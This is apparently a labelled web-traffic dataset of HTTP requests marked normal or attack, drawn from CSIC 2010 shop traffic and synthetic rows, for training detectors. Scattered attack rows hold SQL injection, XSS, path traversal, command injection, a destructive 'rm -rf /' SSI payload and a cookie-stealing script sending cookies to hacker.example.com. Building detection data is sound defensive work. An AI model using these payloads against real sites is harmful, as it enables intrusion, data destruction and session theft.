+GET /tienda1/publico/registro.jsp?modo=registro&login=crystie&password=eSp5u19O&nombre=Georgania&apellidos=Cabezudo+Calders&email=haydn%40veocime.ua&dni=08603168H&direccion=Calle+Ramon+Hernandez+197%2C+9%3FH&ciudad=Atalaya&cp=46149&provincia=Le%F3n&ntc=5184864321979129&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=chatri1&pwd=t8R0E%F3n&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modoA=insertar&precio=4327&B1=Confirmar,attack,csic2010
+POST /search BODY: user=hello world,normal,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=903&B1=Confirmar,normal,csic2010
+GET /contact?comment=..\..\windows\win.ini,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=kenna&password=a6e7i519374n&nombre=Pola&apellidos=Padral+Gracida&email=kubrick.blessed%40suardistec.ee&dni=26150430M&direccion=Calle+Garci-perez+41%2C+9%3FC&ciudad=Altafulla&cp=14859&provincia=Zaragoza&ntc=4928753717678188&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&loginA=irice&pwd=69226p9as6a&remember=off&B1=Entrar,attack,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=salgado&password=de4737UR6a&nombre=Roc%EDo+del+Valle&apellidos=Cendreros&email=basta%4024htranslations.edu&dni=22655130S&direccion=C%2F+Sant+Antoni+Maria+Claret%2C+173+&ciudad=Fornelos+de+Montes&cp=46970&provincia=Huelva&ntc=1281450288895094&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=58&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=tonny&pwd=*aquele&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=el&password=ci1860v7l48&nombre=Rhode&apellidos=Orfila+Ochotorrena&email=quon.occhipinti%40google-movil.bn&dni=36575335E&direccion=Av.+Maria+Auxiliadora+121+&ciudad=Monda&cp=20700&provincia=Sevilla&ntc=8093934676892216&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=fiteny&password=mos*tear&nombre=Bader&apellidos=Carrillo+Intxaurraga&email=lyney8%40intapisur.pr&dni=94153718K&direccion=Calle+Pellisso%2C+61%2C+&ciudad=Casasimarro&cp=02250&provincia=Teruel&ntc=1949707565423527&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=lisetta&password=m6nt7s47r2&nombre=Quinto&apellidos=Casadei+Atuesta&email=leuwerik%40white-pearl-resort.tt&dni=86640216K&direccion=Via+Aurelia+S%2FN+13%3FH&ciudad=Fresno+de+Rodilla&cp=47430&provincia=Albacete&ntc=3076606147063656&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=dionysus&pwd=vuesa&remember=on%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=leigh&pwd=2a045t8&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=7&B1=%252B,attack,csic2010
+GET /download?id=<svG oNload=Alert(1)>,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=abel&password=entresijo&nombre=Divico&apellidos=Tutusaus&email=martlew_vera-ellen%40acch-portugal.as&dni=66809608J&direccion=C%2F+Santa+Teresa+De+Avila%2C+5%2C+3%3FC&ciudad=Arnuero&cp=02439&provincia=Cantabria&ntc=1820193328818228&B1=Registrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9061&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=ayse&pwd=quillotrar&remember=on%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7278&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp/asf-logo-wide.old,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=vasil9&password=lapIdifiCaR&nombre=Kalanit&apellidos=Gelber+Serarols&email=kingston%40professionalhost.com.ag&dni=68364284G&direccion=C%2F+Agachadilla+81+&ciudad=Santa+Eufemia+del+Arroyo&cp=04176&provincia=Madrid&ntc=2532457145340118&B1=Registrar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=man*%3Fg%3Fum&password=31g1ama6o&nombre=Andreas&apellidos=Montells+Callealt&email=gheorghiu-battaglia%40sanchezgordo.bt&dni=72380388D&direccion=Calle+De+La+Ciudad+De+Riga+184+&ciudad=Holguera&cp=46669&provincia=%C1vila&ntc=4378749164701036&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=rubio&password=c35iz3&nombre=Chaila&apellidos=Virella+Altimirs&email=kava_ivic%40comercioenlacalle.info&dni=38993479S&direccion=C%2F+Almansa%2C+91%2C+6D&ciudad=Codos&cp=12427&provincia=Tarragona&ntc=2840005774765443&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=8470&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=storelli&password=enforrar&nombre=Adelfo&apellidos=Pozo+Carbot&email=schiaftino%40showenvivo.com.sy&dni=56891172M&direccion=Calle+Virgen+De+La+Estrella%2C+150%2C+&ciudad=Fresno+de+Rodilla&cp=49624&provincia=%2520&ntc=3044392117548178&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=barbary9&password=med0castro&nombre=Jimena&apellidos=Fiordalizzi+Dilme&email=romain.riefenstahl%40ankawaelda.gs&dni=35449170Y&direccion=Serra+Do+Burgo%2C+S%2FN+10%3FF&ciudad=Olivares+de+J%FAcar&cp=44421&provincia=Girona&ntc=5862414182934929&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=nugent&password=caNgreNaRsE&nombre=Pablo+de+la+Cruz&apellidos=De+Jongh+Algarra&email=jorey%4020horas.ao&dni=37200229Y&direccion=Carrer+Marcos+Redondo%2C+132%2C+8%3FF&ciudad=Piqueras&cp=48031&provincia=Tarragona&ntc=5359941637472612&B1=Registrar,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=lombardy%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=j543ihue3a&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/asf-logo-wide.BAK,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=career&password=tel%E9grafo&nombre=Alexia&apellidos=De+Castro+W%F6lker&email=jans%40voragolive.do&dni=63653644V&direccion=Sanlucar+La+Mayor%2C+148%2C+&ciudad=Atzeneta+del+Maestrat&cpA=16270&provincia=Ciudad+Real&ntc=5906206602610899&B1=Registrar,attack,csic2010
+POST /contact BODY: id=../../bOoT.iNi,attack,synthetic
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=%27+DELETE+FROM+USERS&cantidad=18&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=lerch&password=5elas2omat%E12eo&nombre=Alcira&apellidos=Forn%F3s+Kohls&email=busch%40show.nom.na&dni=71246547E&direccion=Francisco+Ni%F1o%2C+100+&ciudad=Marazoleja&cp=19144&provincia=Valladolid&ntc=2373775613776198&B1=%22+AND+%221%22%3D%221,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=chung&password=us0j6&nombre=Argeo&apellidos=Barco+Montull&email=bowen-gugolka%40soyriojano.name&dni=84881293T&direccion=Calle+Horreo+85+10%3FD&ciudad=Ruesga&cp=45516&provincia=Almer%EDa&ntc=3582076186939679&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=shorwan&password=zapateo&nombre=Leoncio&apellidos=Sanrom%E1n+Casuso&email=mcilwraith_sopaporn%40barebackspain.info&dni=41628831G&direccion=Costa+Rica%2C+112+&ciudad=Vilanova+de+Segri%E0&cp=47320&provincia=Valladolid&ntc=8961254211923124&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: idA=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=36&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=barentse&pwd=8h5cHA2&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=leyden&password=c96revEidil5&nombre=Delia&apellidos=Busoms+Redolad&email=eyre9%40ringringcargo.tn&dni=41022572W&direccion=Las+Palmeras+91+5B&ciudad=Oca%F1a&cp=29691&provincia=Murcia&ntc=9830070914840932&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=mckenney&password=estantalar&nombre=Fulgencia&apellidos=Poma+Gozalbo&email=loti%40ajuntamentbarcelona2-0.is&dni=21924971Z&direccion=C%2F+Huertas+Altas%2C+114+&ciudad=Sequera+de+Haza%2C+La&cp=25260&provincia=Badajoz&ntc=8755728520539974&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=nazanin&password=_colear&nombre=Gorgonio&apellidos=Collantes+Cartaya&email=nieva%40menorca.com.sz&dni=24778234N&direccion=Masia+Can+Mas+Carren%E7a%2C+193%2C+6-F&ciudadA=Huerta+del+Marquesado&cp=30360&provincia=Castell%F3n&ntc=5326981690610617&B1=Registrar,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=horgan&password=777t1c4rio&nombre=Severino&apellidos=Azpilicueta+Eckhardt&email=sarcey-fendel%40gesmahernan.de&dni=62955100Y&direccion=Av.+Benisa+43%2C+10D&ciudad=Atea&cp=36830&provincia=Teruel&ntc=3636105969407891&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precio=39&cantidad=20&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=dung&pwd=7i1ue39do&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=kwokchoi&password=putrefa8tiva&nombre=Brian&apellidos=Compte&email=stroeby%40jesusfelipe.lv&dni=62128531B&direccion=De+Canoves+13%2C+&ciudad=Balaguer&cp=39513&provincia=Lugo&ntc=0854278659322549&B1=Registrar,normal,csic2010
+GET /tienda1/publico/caracteristicas.jsp?id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=nikolia&pwd=qu1s3da&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5854&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=geoffrio&password=coNMUtADOR&nombre=Besari%F3n&apellidos=Portilla+Servitje&email=skerritt.genn%40elcarrermoll.pk&dni=50781133P&direccion=Calle+La+Romerosa+S%2FN+4%3FD&ciudad=Hinojosa+del+Campo&cp=45820&provincia=Navarra&ntc=7694045535403398&B1=Registrar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=delli&password=enfardeladora&nombre=Roberto&apellidos=Vi%F1olas&email=colligan%40nexuspark.dz&dni=02858717R&direccion=C%2F+Francisco+Javier+Simonet+7%2C+11%3FE&ciudad=Muskiz&cp=49160&provincia=Salamanca&ntc=4551401932172135&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=akbas3&pwdA=6r6s1arr%E17&remember=on&B1=Entrar,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&loginA=dion&pwd=tric%F3tomo&remember=off&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9061&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=lemmie&pwdA=InteMPesTI%2Bvo&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=9536&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=finucane&password=nicarag%FCe%F1o&nombre=Tiziana&apellidos=Clop%E9s+Nasra&email=tichenor%40so-tel.md&dni=20221396A&direccion=Calle+Moises%2C+76+1B&ciudad=Mu%F1opepe&cp=48221&provincia=Madrid&ntc=5946578897035450&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=4965&B1=Confirmar%2F,attack,csic2010
+PUT /tienda1/miembros/editar.jsp BODY: modo=registro&login=lodesert&password=heRramienTa&nombre=Edelmira&apellidos=Capo+Garc%EDa&email=bugbee%40farma-job.cd&dni=55645514G&direccion=C%2F+Santander+S%2FN%2C+&ciudad=Roca+de+la+Sierra%2C+La&cp=05289&provincia=Badajoz&ntc=4927358900726396&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=2323&B1A=Pasar+por+caja,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3%2F&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=estel&pwd=0s2933%2B7e2A&rememberA=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=lander&password=ner%D3n&nombre=H%E9ctor&apellidos=Cabezon+Huguet&email=gerritsen%40isbn.com.ac&dni=05385749T&direccion=Teucro+173+&ciudad=Cilleruelo+de+Arriba&cp=26111&provincia=%C1vila&ntc=9510066940047768&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=14&B1=A%F1adir+al+carrito,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=syrett&pwd=cU%E1KeRa&remember=on&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7379&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8145&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/asf-logo-wide.gif/.OLD,attack,csic2010
+GET /profile?email=; ls -la,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=maudie&password=cegaTo%3Fso&nombre=Yured&apellidos=Modrego+Aylagas&email=natzler.machiavelli%40francislucille.cy&dni=68096192T&direccion=C%2F+Carlos+De+La+Rica%2C+8+11%3FA&ciudad=Puigverd+d%27Agramunt&cp=08672&provincia=Palencia&ntc=276695642551071A&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=%2520&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=68&B1=A%F1adir+al+carrito,attack,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=ornelas&pwdA=frail%EDa&remember=on&B1=Entrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=fabris&password=dEsEnquieTar&nombre=Epifanio&apellidos=Minguez+Joanmart&email=denny%40ajuntamentbarcelona2-0.us&dni=41585257S&direccion=Corva+198+12%3FH&ciudad=Bovera&cp=09259&provincia=%C1vila&ntcA=3393065901752374&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=weimin&password=reposici%F3n&nombre=I%F1igo&apellidos=Florit+Tobella&email=crystal%40941.cg&dni=11398418D&direccion=Avda.+Ana+De+Viya+77+&ciudad=Alt+%C0neu&cp=05358&provincia=Soria&ntc=7593492603820310&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=100&cantidad=82&B1=A%F1adir+al+carrito,normal,csic2010
+POST /contact BODY: email=1; DrOP tABLe UsErS,attack,synthetic
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=leeson&pwd=AdEHaLa&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=4508&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Queso+Manchego&precio=85&cantidad=3&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/imagenes/3.gif/6909030637832563290.jsp~,attack,csic2010
+POST /contact BODY: user=; ls -la,attack,synthetic
+"GET /products?file=x' UNION SELECT NULL,NULL--",attack,synthetic
+POST /tienda1/publico/caracteristicas.jsp BODY: id=%2520,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Queso+Manchego&precio=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cantidad=21&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=6965&B1=Pasar+por+caja%2F,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=d*o%2Bngi*k&password=-57s5g03&nombre=Sigrid&apellidos=Aranzadi+Henkel&email=cliff5%40fichajes.nom.ms&dni=61093505P&direccion=Mo%F1as+S%2FN%2C+&ciudad=Sax&cp=22255&provincia=Madrid&ntc=1364126817729617&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8965&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=deok&pwd=d94a*r580ol7er&remember=off&B1=Entrar,normal,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=7832&B1=Confirmar%2F,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=9498&B1=Confirmar,normal,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=cato&password=6ac%ED8ic0&nombre=Auberto&apellidos=Novell&email=shiller_neilson-terry%40tacticlinks.mx&dni=93501439E&direccion=C%2F+Torners%2C+5+4%3FE&ciudad=Vilanova+de+Mei%E0&cp=09620&provincia=%C1vila&ntc=3408131078421443&B1=Registrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=7013&B1=Confirmar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=16&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=vasilopo&pwd=ladROnzue_LO&remember=off&B1=Entrar,normal,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=993&B1=Pasar+por+caja,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=tac&password=e486ac0%F34&nombre=Atal%EDvar&apellidos=Blaya&email=ryle%40professionalhosting.com.cv&dni=25454571B&direccion=Calle+Pastor+De+Iberia+S%2FN%2C+2E&ciudad=Vilanova+de+la+Barca&cp=2228A&provincia=Palencia&ntc=0517144420469351&B1=Registrar,attack,csic2010
+GET /products?email=<script>alert(1)</script>,attack,synthetic
+GET /tienda1/publico/autenticar.jsp?modo=entrar&login=nabeel&pwd=vanidOsa&remember=on&B1=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,attack,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=jagath&password=azOrR1RsE&nombre=Sili&apellidos=Maslo+Arrunategui&email=davray.chayevsky4%40sierradealcaraz.um&dni=97290360S&direccion=C%2F+Galindez+De+Carvajal%2C+27+&ciudad=%3F&cp=09692&provincia=Le%F3n&ntc=8772164486474313&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=resve7&password=huc55&nombre=Geraldina&apellidos=Vilasis+Mena&email=sarfati%40weat.nc&dni=08466616V&direccion=San+Juan+Bosco+113+1-D&ciudad=Arres&cp=31096&provincia=Barcelona&ntc=0598963816827000&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=maya5&pwd=sEMITIsmO&remember=off&B1=Entrar,normal,csic2010
+POST /profile BODY: id=42,normal,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=palmer&password=maletero&nombre=Zarina&apellidos=Rotger+San+Emeterio&email=rolfing%40juanpolo.uy&dni=22924581K&direccion=Calle+San+Adrian%2C+117%2C+8H&ciudad=Arrancacepas&cp=42294&provincia=Salamanca&ntc=2945357647174104&B1=Registrar,normal,csic2010
+POST /tienda1/publico/autenticar.jsp BODY: modo=entrar&login=newcomb&pwd=ContrApoTENzADO&remember=on&B1=Entrar,normal,csic2010
+GET /tienda1/miembros/editar.jsp?modo=registro&login=sheehan&password=m%3Fi&nombre=Sharon&apellidos=Balac+Ginet&email=gotell%40muevemiweb.wf&dni=06136230Z&direccion=C%2F+Comandante+Roman%2C+S%2FN+&ciudad=Navas+del+Rey&cp=08696&provincia=Salamanca&ntc=0788909004705438&B1=Registrar,normal,csic2010
+GET /tienda1/publico/productos.jsp/6909030637832563290.jsp.INC,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=1&B1=A%F1adir+al+carrito,attack,csic2010
+POST /search BODY: email=1234,normal,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=bulanda&password=co3trI%F1ir&nombre=Beatriz&apellidos=Cartoni.+_Mendiz.%E1bal&email=binney8%40telogis.lb&dni=39498492V&direccion=Calle+Atico+Noguerol+192%2C+7E&ciudad=Elduain&cp=22190&provincia=Toledo&ntc=1924133576102581&B1=Registrar,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Vino+Rioja&precio=85&cantidad=94&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=muni&password=B1Aso0A3745&nombre=Adelmo&apellidos=Bes+Novalbos&email=hermanek%40estudiodeyoga.sg&dni=28827581W&direccion=Grupo+San+Pablo%2C+136+11%3FC&ciudad=Vega+de+Tirados&cp=31229&provincia=Barcelona&ntc=9029656954675704&B1=Registrar,normal,csic2010
+POST /view BODY: file=&& whoami,attack,synthetic
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=6421&B1=Confirmar,normal,csic2010
+GET /view?name=%3CScRipT%3EAleRt%281%29%3C/ScRiPT%3E,attack,synthetic
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=erdinc&password=3e39a62r&nombre=Haroidsessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&apellidos=Peldoza+Restrepo&email=valentic%40programagestionerp.ma&dni=91385141T&direccion=Calle+Alhama+De+Granada%2C+164%2C+&ciudad=Olmedilla+de+Eliz&cp=07142&provincia=Cantabria&ntc=1803474685764017&B1=Registrar,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,normal,csic2010
+GET /vti_txt/,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=12&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=jean-pau&password=HIpISmo&nombre=Sili&apellidos=Capllonc+Carreto&email=turay-fleugel%40youtubeanunciox.web&dni=44885236T&direccion=Pl.+Profesor+Ferdinand+Montlannch%2C+59%2C+&ciudad=Vici%E9n&cp=37893&provincia=Cuenca&ntc=2353331803178322&B1=Registrar,normal,csic2010
+GET /tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=85&cantidad=49&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/4861362529278789730.INC,attack,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=1&nombre=Vino+Rioja&precio=39&cantidad=16&B1=A%F1adir+al+carrito,normal,csic2010
+GET /tienda1/publico/registro.jsp?modo=registro&login=montijo&password=mane79&nombre=Lihuen&apellidos=Bibiloni+Urdi&email=brion%40baybay.gi&dni=934A195AM&direccion=Gerona+89+&ciudad=Olocau+del+Rey&cp=16122&provincia=Valladolid&ntc=2304911329453006&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=hoeler&passwordA=POsTreMERa&nombre=Fructuoso&apellidos=Lolli+Marmol&email=dannemann%40ytv.com.edu&dni=50493531K&direccion=Calle+Duque+De+La+Riva%2C+67%2C+&ciudad=Llimiana&cp=31013&provincia=C%E1diz&ntc=5302389212844802&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=hanham1&password=4aj9ble&nombre=Kassandra&apellidos=Elespuru&email=sovic%40a2hotels.sj&dni=22562718V&direccion=Camino+De+Humanes%2C+43+9%3FB&ciudad=Monsalupe&cp=03794&provincia=Girona&ntc=0825075702605085&B1=Registrar,normal,csic2010
+POST /tienda1/publico/anadir.jsp BODY: id=3&nombreA=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/publico/pagar.jsp BODY: modo=insertar&precio=5500&B1=Pasar+por+caja%2F,attack,csic2010
+GET /tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85%2F&cantidad=13&B1=A%F1adir+al+carrito,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=monteiro&password=InDefIciente&nombre=Teranciano&apellidos=Flores+Dayekh&email=newcomb%40fbi-criminal-network.com.ba&dni=39910583V&direccion=Calle+Candil%2C+38+7%3FB&ciudad=Marchamalo&cp=37799&provincia=Zaragoza&ntc=9926995556034564&B1=Registrar,normal,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=izique&password=48a6850ll3&nombre=Otilia&apellidos=Planelles+Neris&email=divoka%40mercadozoom.bf%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&dni=36504708M&direccion=Calle+Bolivia%2C+69%2C+&ciudad=Avil%E9s&cp=22468&provincia=Le%F3n&ntc=1926544477784446&B1=Registrar,attack,csic2010
+GET /tienda1/publico/pagar.jsp?modo=insertar&precio=8816&B1=Confirmar%2F,attack,csic2010
+GET /search?email=%27%3B%20EXEC%20xp_cmdshell%28%27dir%27%29%3B--,attack,synthetic
+GET /tienda1/publico/registro.jsp?modo=registro&login=essam&password=Cat*ER%E9tiCA&nombre=Dacil&apellidos=Matamala&email=sabin.prester%40sandrasummer.jm&dni=65185439N&direccion=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&ciudad=Gumiel+de+Mercado&cp=48140&provincia=Badajoz&ntc=9377201272032369&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=kluger&password=bIrloC5e&nombre=Valquiria&apellidos=Arribas+Larrakoetxea&email=hinton.mcglory%40universla.um&dni=19130448Z&direccion=C%2F+Samaria+167+8%3FA&ciudad=Maderuelo&cp=19120&provincia=Segovia&ntc=5248785618032117&B1=Registrar,normal,csic2010
+POST /download BODY: file=/var/www/../../etc/hosts,attack,synthetic
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=nyberg&password=predicha&nombre=Carmina&apellidos=Serarols+Ginesta&email=redford2%40enlanzarote.com.cz&dni=80243620R&direccion=Zumel+S%2FN%2C+&ciudad=Blasconu%F1o+de+Matac.abr%3Fas&cp=05420&provincia=Zamora&ntc=5782200649154235&B1=Registrar,attack,csic2010
+POST /tienda1/miembros/editar.jsp BODY: modo=registro&login=rokas&password=telarejo&nombre=Ma%2Fr%F3-n&apellidos=Eraso+Rebes&email=lapotaire%40psicoencuentronline.cc&dni=32760470Y&direccion=C%2F+Los+Arces%2C+155%2C+&ciudad=Castej%F3n+del+Puente&cp=40314&provincia=Girona&ntc=8177793043919155&B1=Registrar,attack,csic2010
+POST /tienda1/publico/registro.jsp BODY: modo=registro&login=stewart&password=4uB16nS8RV0do5&nombre=Waldemar&apellidos=Rapetto+Picabea&email=stanley_mannheim%40showcarsmadrid.gn&dni=07160844R&direccion=Calle+De+Piquer%2C+8%2C+&ciudad=Machac%F3n&cp=48710&provincia=Lleida&ntc=2651730269519486&B1=Registrar,normal,csic2010
